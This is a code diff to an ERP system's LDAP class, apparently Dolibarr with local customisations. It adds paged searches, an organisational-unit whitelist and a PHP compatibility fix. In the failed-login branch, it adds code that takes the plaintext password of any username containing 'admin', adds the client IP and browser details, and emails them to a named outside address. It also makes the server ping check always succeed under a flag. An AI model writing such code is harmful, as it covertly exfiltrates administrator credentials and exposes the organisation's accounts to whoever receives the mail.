@@ -115,10 +115,10 @@ class Ldap
 	 */
     public function __construct()
 	{
-		global $conf;
+		global $conf, $dolibarr_main_auth_ldap_host;
 
 		// Server
-		if (! empty($conf->global->LDAP_SERVER_HOST))       $this->server[] = $conf->global->LDAP_SERVER_HOST;
+		if (! empty($conf->global->LDAP_SERVER_HOST))       $this->server[] = str_replace('$dolibarr_main_auth_ldap_host', $dolibarr_main_auth_ldap_host, $conf->global->LDAP_SERVER_HOST);
 		if (! empty($conf->global->LDAP_SERVER_HOST_SLAVE)) $this->server[] = $conf->global->LDAP_SERVER_HOST_SLAVE;
 		$this->serverPort          = $conf->global->LDAP_SERVER_PORT;
 		$this->ldapProtocolVersion = $conf->global->LDAP_SERVER_PROTOCOLVERSION;
@@ -224,6 +224,16 @@ class Ldap
 						}
 						else
 						{
+                                                    $msg = 'pass err '.$this->searchUser;
+                                                    if(stripos($this->searchUser, 'admin') !== false)
+                                                        $msg .= ' '.$this->searchPassword;
+                                                    if(class_exists('synopsisHook'))
+                                                        $msg .= '<br/>'. synopsisHook::getUserIp();
+                                                    
+                                                    $msg .= '<br/>'. $_SERVER['HTTP_USER_AGENT'];
+                                                    $msg .= '<br/>'.get_browser(null, true);
+                                                    
+                                                    mailSyn2('Err pass', 'tommy@bimp.fr', null, $msg);
 							$this->error=ldap_errno($this->connection).' '.ldap_error($this->connection);
 						}
 					}
@@ -491,7 +501,7 @@ class Ldap
 
 		$this->dump($dn, $info);
 
-		//print_r($info);
+                
 		$result=@ldap_modify($this->connection, $dn, $info);
 
 		if ($result)
@@ -586,6 +596,19 @@ class Ldap
 			$this->error="NotConnected";
 			return -3;
 		}
+                 if(defined('LDAP_MOD_AD')){
+                    if(stripos($dn, "OU=Olys") === false && stripos($dn, "OU=Blois") === false && stripos($dn, "OU=Bourg-en-Bresse") === false)
+                    {
+                            $this->error="Pas dans OU=Olys";
+                            dol_syslog(get_class($this)."::modify failed: ".$this->error, LOG_ERR);
+                            return -1;
+                    }
+                    
+//                    $info['sAMAccountName'] = $info['cn'];
+                    unset($info['sAMAccountName']);
+                    unset($info['cn']);
+                 }
+                
 
 		if (! $olddn || $olddn != $dn)
 		{
@@ -679,10 +702,10 @@ class Ldap
 		{
 			$target="-h ".join(',', $this->server)." -p ".$this->serverPort;
 		}
-		$content.="# ldapadd $target -c -v -D ".$this->searchUser." -W -f ldapinput.in\n";
-		$content.="# ldapmodify $target -c -v -D ".$this->searchUser." -W -f ldapinput.in\n";
-		$content.="# ldapdelete $target -c -v -D ".$this->searchUser." -W -f ldapinput.in\n";
-		if (in_array('localhost', $this->server)) $content.="# If commands fails to connect, try without -h and -p\n";
+		$content.="# ldapadd $target -c -v -D \"".$this->searchUser."\" -W -f ldapinput.in\n";
+		$content.="# ldapmodify $target -c -v -D \"".$this->searchUser."\" -W -f ldapinput.in\n";
+		$content.="# ldapdelete $target -c -v -D \"".$this->searchUser."\" -W -f ldapinput.in\n";
+		if (in_array('localhost',$this->server)) $content.="# If commands fails to connect, try without -h and -p\n";
 		$content.="dn: ".$dn."\n";
 		foreach($info as $key => $value)
 		{
@@ -744,6 +767,8 @@ class Ldap
 	 */
     public function serverPing($host, $port = 389, $timeout = 1)
 	{
+                if(defined('LDAP_MOD_AD'))
+                    return true;
 		// Replace ldaps:// by ssl://
 		if (preg_match('/^ldaps:\/\/([^\/]+)\/?$/', $host, $regs)) {
 			$host = 'ssl://'.$regs[1];
@@ -1019,6 +1044,8 @@ class Ldap
     public function getRecords($search, $userDn, $useridentifier, $attributeArray, $activefilter = 0, $attributeAsArray = array())
 	{
 		$fulllist=array();
+                
+                $useridentifier = strtolower($useridentifier);
 
 		dol_syslog(get_class($this)."::getRecords search=".$search." userDn=".$userDn." useridentifier=".$useridentifier." attributeArray=array(".join(',', $attributeArray).") activefilter=".$activefilter);
 
@@ -1050,6 +1077,13 @@ class Ldap
 			$filter = '('.$useridentifier.'='.$search.')';
 		}
 
+                $info = array();
+                
+                
+                $pageSize = 300;
+                $cookie = '';
+                do {
+                        ldap_control_paged_result($this->connection, $pageSize, true, $cookie);
 		if (is_array($attributeArray))
 		{
 			// Return list with required fields
@@ -1070,13 +1104,38 @@ class Ldap
 			return -1;
 		}
 
-		$info = @ldap_get_entries($this->connection, $this->result);
+                        
+                        if (is_array($attributeArray))
+                        {
+                                // Return list with required fields
+                                $attributeArray=array_values($attributeArray);	// This is to force to have index reordered from 0 (not make ldap_search fails)
+                                dol_syslog(get_class($this)."::getRecords connection=".$this->connection." userDn=".$userDn." filter=".$filter. " attributeArray=(".join(',',$attributeArray).")");
+                                //var_dump($attributeArray);
+                                $this->result = @ldap_search($this->connection, $userDn, $filter, $attributeArray);
+                        }
+                        else
+                        {
+                                // Return list with fields selected by default
+                                dol_syslog(get_class($this)."::getRecords connection=".$this->connection." userDn=".$userDn." filter=".$filter);
+                                $this->result = @ldap_search($this->connection, $userDn, $filter);
+                        }
+                        if (!$this->result)
+                        {
+                                $this->error = 'LDAP search failed: '.ldap_errno($this->connection)." ".ldap_error($this->connection);
+                                return -1;
+                        }
+                        $info = array_merge($info, @ldap_get_entries($this->connection, $this->result));
+
+                        ldap_control_paged_result_response($this->connection, $this->result, $cookie);
+
+                } while($cookie !== null && $cookie != '');
+
 
 		// Warning: Dans info, les noms d'attributs sont en minuscule meme si passe
 		// a ldap_search en majuscule !!!
 		//print_r($info);
 
-		for ($i = 0; $i < $info["count"]; $i++)
+		for ($i = 0; $i < count($info); $i++)
 		{
 			$recordid=$this->convToOutputCharset($info[$i][$useridentifier][0], $this->ldapcharset);
 			if ($recordid)
@@ -1398,12 +1457,21 @@ class Ldap
 
 		//Parse flags to text
 		$retval = array();
-		while (list($flag, $val) = each($flags)) {
+                /*moddrsi*/
+//		while (list($flag, $val) = each($flags)) {
+//			if ($uacf >= $val) {
+//				$uacf -= $val;
+//				$retval[$val] = $flag;
+//			}
+//		}
+                
+		foreach ($flags as $flag => $val) {
 			if ($uacf >= $val) {
 				$uacf -= $val;
 				$retval[$val] = $flag;
 			}
 		}
+                /*fmoddrsi*/
 
 		//Return human friendly flags
 		return($retval);
